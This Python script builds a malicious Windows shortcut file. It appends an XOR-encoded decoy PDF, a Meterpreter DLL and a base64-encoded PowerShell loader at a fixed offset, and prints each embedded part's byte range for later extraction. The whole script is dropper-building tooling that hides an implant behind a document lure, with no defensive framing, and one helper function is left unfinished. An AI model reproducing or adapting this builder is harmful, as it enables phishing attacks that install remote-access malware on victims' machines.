import base64

from itertools import cycle


lnk_name = 'ds7002.lnk'
xor_key = 'a'
script_position = 0x0005e2be

pdf_name = 'ds7002.pdf'
dll_name = 'meterpreter.dll'
script_name = 'loader.ps1'


def xor(data, key):
	return bytearray([ a ^ ord(b) for (a,b) in zip(data, cycle(key)) ])


def encode_utf8(data):
	enc_data = base64.b64encode(data)
	return enc_data


def append_file(filename, to_encode, to_encrypt, seek=None):

	with open(filename, 'rb') as in_file:
		data = in_file.read()

	if to_encode:
		data = encode_utf8(data)

	if to_encrypt:
		data = xor(data, xor_key)

	with open(lnk_name, 'ab') as out_file:
		if seek:
			seek_length = seek - out_file.tell()
			out_file.write(bytearray((chr(0) * seek_length).encode('utf-8')))

		print(filename + ' start byte is: 0x%0.8x' % out_file.tell())
		out_file.write(data)
		print(filename + ' end byte is: 0x%0.8x' % out_file.tell())


def append_script(filename):

	with open(filename, 'rb') as in_file:
		data = in_file.read()


def main():
	append_file(pdf_name, False, True)
	append_file(dll_name, False, True)
	append_file(script_name, True, False, script_position)

if __name__ == '__main__':
	main()